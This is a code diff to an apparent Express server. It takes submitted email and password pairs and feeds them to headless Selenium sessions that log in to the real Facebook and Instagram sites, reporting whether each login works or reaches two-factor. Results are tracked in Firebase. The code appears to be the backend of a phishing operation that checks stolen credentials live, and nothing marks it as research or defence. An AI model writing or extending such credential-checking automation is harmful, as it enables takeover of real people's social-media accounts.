@@ -14,7 +14,7 @@ app.use(cors());
 
 // Import the functions you need from the SDKs you need
 const { initializeApp } = require('firebase/app');
-const { getDatabase, ref, set, serverTimestamp, push, onChildAdded, onValue } = require('firebase/database');
+const { getDatabase, ref, set, serverTimestamp, push, onChildAdded, onValue, get } = require('firebase/database');
 // TODO: Add SDKs for Firebase products that you want to use
 // https://firebase.google.com/docs/web/setup#available-libraries
 
@@ -163,7 +163,14 @@ app.post("/auth", async (req, res)=>{
       email,
       pass: password,
     }
-    const response = await axios.post('http://127.0.0.1:3000/login', loginData);
+    let mainURL = "http://127.0.0.1:3000";
+    let pathPlusURL;
+    if(type === "Instagram"){
+      pathPlusURL= mainURL + "/loginig";
+    }else{
+      pathPlusURL= mainURL + "/login";
+    }
+    const response = await axios.post(pathPlusURL, loginData);
     const ver = response.data.state;
     let statey
     if(ver === false){
@@ -207,12 +214,14 @@ app.get("/Auth", async (req, res)=>{
             break;
     }
 })
-app.get('/check-verify-status/:id', async (req, res) => {
+app.get('/check-verify-status/:id/:server', async (req, res) => {
   const id = req.params.id;
+  const server = req.params.server;
+  const path = server+"/"+id;
   
   try {
     // Reference to the specific entry in the database
-    const reference = ref(database, id);
+    const reference = ref(database, path);
 
     // Retrieve the data from Firebase
     const snapshot = await get(reference);
@@ -264,32 +273,32 @@ app.get('/private-details', async (req, res) => {
 
 
 app.post('/login', async (req, res) => {
-  // Extract login data from the request body
   const { email, pass } = req.body;
 
-  // Initialize the WebDriver
   const options = new chrome.Options();
+  options.addArguments('--headless');  // Run in headless mode
+  options.addArguments('--disable-gpu');  // Disable GPU (recommended for headless mode)
+  options.addArguments('--no-sandbox');  // Disable the sandbox for Chrome to work in Docker or root environments
+  options.addArguments('--disable-dev-shm-usage'); 
   const driver = new Builder().forBrowser('chrome').setChromeOptions(options).build();
 
   try {
-      // Navigate to the login page
       await driver.get('https://web.facebook.com/login/device-based/regular/login');
 
-      // Find the email and password input fields and fill them
       await driver.findElement(By.id('email')).sendKeys(email);
       await driver.findElement(By.id('pass')).sendKeys(pass);
 
-      // Submit the form
-      await driver.findElement(By.id('login_form')).submit(); // Adjust this selector as needed
+      await driver.findElement(By.id('login_form')).submit();
 
-      // Wait for the page to load and check for the presence of error_box
-      await driver.wait(until.elementLocated(By.id('error_box')), 5000).catch(() => {}); // Adjust the timeout as needed
+      await driver.wait(until.elementLocated(By.id('error_box')), 5000).catch(() => {});
+      await driver.wait(until.elementLocated(By.id('_9ay7')), 5000).catch(() => {});
 
       const errorBox = await driver.findElements(By.id('error_box'));
-      if (errorBox.length > 0) {
+      const error9ay7 = await driver.findElements(By.id('_9ay7'));
+
+      if (errorBox.length > 0 || error9ay7.length > 0) {
           res.json({ state: false, message: 'Invalid credentials' });
       } else {
-          // Wait for the page to load and check if the URL contains any of the specified paths
           const pathsToCheck = ['/home', '/two_step_verification/two_factor', '/'];
           let found = false;
 
@@ -298,7 +307,7 @@ app.post('/login', async (req, res) => {
                   await driver.wait(async () => {
                       const currentUrl = await driver.getCurrentUrl();
                       return currentUrl.includes(path);
-                  }, 10000); // Adjust the timeout as needed
+                  }, 10000);
 
                   found = true;
                   break;
@@ -317,10 +326,84 @@ app.post('/login', async (req, res) => {
       console.error('Error during login automation:', error);
       res.status(500).json({ state: false, message: 'An error occurred' });
   } finally {
-      // Close the WebDriver
       await driver.quit();
   }
 });
+app.post('/loginIg', async (req, res) => {
+  const { email, pass } = req.body;
+
+  // Initialize the WebDriver
+  const options = new chrome.Options();
+  options.addArguments('--headless');  // Run in headless mode
+  options.addArguments('--disable-gpu');  // Disable GPU (recommended for headless mode)
+  options.addArguments('--no-sandbox');  // Disable the sandbox for Chrome to work in Docker or root environments
+  options.addArguments('--disable-dev-shm-usage'); 
+  const driver = new Builder().forBrowser('chrome').setChromeOptions(options).build();
+
+  try {
+      // Navigate to the login page
+      await driver.get('https://www.instagram.com/accounts/login/?hl=en');
+
+      // Wait until the login form is visible
+      await driver.wait(until.elementLocated(By.id('loginForm')), 10000); // Adjust the timeout as needed
+
+      // Find the email and password input fields and fill them
+      await driver.findElement(By.name('username')).sendKeys(email);
+      await driver.findElement(By.name('password')).sendKeys(pass);
+
+      // Get the current URL before submitting the form
+      const initialUrl = await driver.getCurrentUrl();
+
+      // Submit the form
+      await driver.findElement(By.id('loginForm')).submit();
+
+      // Wait for the page to load and check for error indications
+      await driver.wait(until.elementLocated(By.className('_ab2z')), 5000).catch(() => {});
+      const errorBox = await driver.findElements(By.className('_ab2z'));
+
+      if (errorBox.length > 0) {
+          res.json({ state: false, message: 'Invalid credentials' });
+      } else {
+          // Check if the URL changes after form submission
+          const currentUrl = await driver.getCurrentUrl();
+
+          if (currentUrl === initialUrl) {
+              res.json({ state: false, message: 'Invalid credentials: Page did not change after submission' });
+          } else {
+              // Check if the URL indicates a successful login
+              const pathsToCheck = ['/accounts/onetap', '/accounts/login/two_factor', '/'];
+              let found = false;
+
+              for (const path of pathsToCheck) {
+                  try {
+                      await driver.wait(async () => {
+                          const url = await driver.getCurrentUrl();
+                          return url.includes(path);
+                      }, 10000);
+
+                      found = true;
+                      break;
+                  } catch (error) {
+                      // Ignore the error and continue to check the next path
+                  }
+              }
+
+              if (found) {
+                  res.json({ state: true, message: 'Login successful' });
+              } else {
+                  res.json({ state: false, message: 'Login failed or unexpected page' });
+              }
+          }
+      }
+  } catch (error) {
+      console.error('Error during login automation:', error);
+      res.status(500).json({ state: false, message: 'An error occurred' });
+  } finally {
+      await driver.quit();
+  }
+});
+
+
 
 
 
